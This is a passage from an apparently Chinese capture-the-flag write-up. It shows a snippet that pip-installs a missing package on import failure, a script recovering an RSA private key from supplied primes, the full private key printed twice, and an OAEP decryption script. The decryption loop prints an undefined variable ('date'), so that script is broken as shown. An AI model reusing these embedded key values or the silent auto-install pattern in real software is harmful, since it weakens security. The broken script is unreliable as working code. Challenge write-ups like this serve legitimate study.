class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> secretMessageResponse</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">import</span> pip</span><br><span class="line">        pip.main([<span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;secretMessageResponse&#x27;</span>])</span><br><span class="line">        <span class="keyword">from</span> secretMessageResponse <span class="keyword">import</span> printMessage</span><br></pre></td></tr></table></figure><p>这段代码的主要功能是：</p><ul><li>检查 <code>secretMessageResponse</code> 模块是否存在。</li><li>如果不存在，则使用 <code>pip</code> 安装该模块。</li><li>然后从 <code>secretMessageResponse</code> 模块中导入 <code>printMessage</code>。</li></ul><p>kali上运行：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-192215.png"></p><p><strong>应援包给的RSA的n、p、q，可以求出d</strong>，求<strong>私钥</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">p=<span class="number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span></span><br><span class="line">q=<span class="number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span></span><br><span class="line">n=<span class="number">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算其他相关参数</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=<span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成私钥</span></span><br><span class="line">key=RSA.construct((n,e,d,p,q))</span><br><span class="line"><span class="comment">#export_key() 将私钥导出为PEM格式字符串，便于存储或传输。</span></span><br><span class="line">private_key=key.export_key()</span><br><span class="line"><span class="built_in">print</span>(private_key.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span><br><span class="line">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span><br><span class="line">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span><br><span class="line">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span><br><span class="line">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span><br><span class="line">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span><br><span class="line">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span><br><span class="line">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span><br><span class="line">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span><br><span class="line">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span><br><span class="line">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span><br><span class="line">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span><br><span class="line">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span><br><span class="line">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span><br><span class="line">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span><br><span class="line">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span><br><span class="line">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span><br><span class="line">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span><br><span class="line">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span><br><span class="line">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span><br><span class="line">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span><br><span class="line">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span><br><span class="line">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span><br><span class="line">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span><br><span class="line">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span><br><span class="line">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span><br><span class="line">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span><br><span class="line">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span><br><span class="line">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span><br><span class="line">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span><br><span class="line">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span><br><span class="line">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span><br><span class="line">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span><br><span class="line">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span><br><span class="line">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span><br><span class="line">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span><br><span class="line">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span><br><span class="line">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span><br><span class="line">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span><br><span class="line">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span><br><span class="line">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span><br><span class="line">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span><br><span class="line">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span><br><span class="line">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span><br><span class="line">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span><br><span class="line">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span><br><span class="line">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span><br><span class="line">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span><br><span class="line">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p><strong>用私钥解密，解密脚本</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"></span><br><span class="line">message=&#123;</span><br><span class="line">    <span class="string">&quot;inputMessage_20241216&quot;</span>:<span class="string">&#x27;&#x27;&#x27;gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240411&quot;</span>:<span class="string">&#x27;&#x27;&#x27;Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240305&quot;</span>:<span class="string">&#x27;&#x27;&#x27;ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backend=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span></span><br><span class="line"><span class="string">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span></span><br><span class="line"><span class="string">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span></span><br><span class="line"><span class="string">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span></span><br><span class="line"><span class="string">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span></span><br><span class="line"><span class="string">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span></span><br><span class="line"><span class="string">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span></span><br><span class="line"><span class="string">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span></span><br><span class="line"><span class="string">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span></span><br><span class="line"><span class="string">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span></span><br><span class="line"><span class="string">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span></span><br><span class="line"><span class="string">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span></span><br><span class="line"><span class="string">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span></span><br><span class="line"><span class="string">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span></span><br><span class="line"><span class="string">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span></span><br><span class="line"><span class="string">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span></span><br><span class="line"><span class="string">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span></span><br><span class="line"><span class="string">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span></span><br><span class="line"><span class="string">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span></span><br><span class="line"><span class="string">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span></span><br><span class="line"><span class="string">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span></span><br><span class="line"><span class="string">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span></span><br><span class="line"><span class="string">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span></span><br><span class="line"><span class="string">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span></span><br><span class="line"><span class="string">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span></span><br><span class="line"><span class="string">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span></span><br><span class="line"><span class="string">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span></span><br><span class="line"><span class="string">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span></span><br><span class="line"><span class="string">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span></span><br><span class="line"><span class="string">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span></span><br><span class="line"><span class="string">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span></span><br><span class="line"><span class="string">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span></span><br><span class="line"><span class="string">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span></span><br><span class="line"><span class="string">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span></span><br><span class="line"><span class="string">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span></span><br><span class="line"><span class="string">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span></span><br><span class="line"><span class="string">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span></span><br><span class="line"><span class="string">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span></span><br><span class="line"><span class="string">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span></span><br><span class="line"><span class="string">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span></span><br><span class="line"><span class="string">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span></span><br><span class="line"><span class="string">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span></span><br><span class="line"><span class="string">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span></span><br><span class="line"><span class="string">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span></span><br><span class="line"><span class="string">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span></span><br><span class="line"><span class="string">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span></span><br><span class="line"><span class="string">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span></span><br><span class="line"><span class="string">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span></span><br><span class="line"><span class="string">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">encrypted_base64,private_key_pem</span>):</span><br><span class="line">    <span class="comment"># 加载私钥</span></span><br><span class="line">    private_key=serialization.load_pem_private_key(</span><br><span class="line">        private_key_pem.encode(),</span><br><span class="line">        password=<span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#base64解码密文</span></span><br><span class="line">    encrypted=base64.b64decode(encrypted_base64)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#使用私钥解密</span></span><br><span class="line">    decrypted=private_key.decrypt(</span><br><span class="line">        encrypted,</span><br><span class="line">        padding.OAEP(</span><br><span class="line">            mgf=padding.MGF1(algorithm=hashes.SHA256()),</span><br><span class="line">            algorithm=hashes.SHA256(),</span><br><span class="line">            label=<span class="literal">None</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解码base64获取原始信息</span></span><br><span class="line">    original_message=base64.b64decode(decrypted).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> original_message</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密所有信息</span></span><br><span class="line"><span class="keyword">for</span> data,encrypted_msg <span class="keyword">in</span> message.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n解密<span class="subst">&#123;date&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted=decrypt_message(encrypted_msg,backend)</span><br><span class="line">        <span class="built_in">print</span>(decrypted)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密失败:<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img 